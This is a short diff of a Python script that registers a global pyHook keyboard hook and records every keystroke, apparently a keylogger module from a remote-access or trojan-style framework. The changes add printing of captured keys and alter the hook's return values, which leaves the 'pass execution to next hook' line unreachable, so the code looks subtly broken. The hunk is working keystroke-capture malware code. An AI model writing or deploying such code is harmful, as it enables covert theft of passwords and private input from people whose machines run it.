@@ -16,17 +16,19 @@ def run(**args):
 		if event.Ascii > 32 and event.Ascii < 127:
 			
 			keyz = chr(event.Ascii)
-			return str(keyz),
+			print (keyz)
+			return str(keyz)
 
 		else:
 			othKeyz = "[%s]" % event.Key
-			return str(othKeyz),
+			print (othKeyz)
+			return str(othKeyz)
 
 		# pass execution to next hook
 		return True
 
 	# create and register a hook manager
-	k1			= pyHook.HookManager()
+	k1		= pyHook.HookManager()
 	k1.KeyDown	= KeyStroke
 
 	# register the hook and excute forever
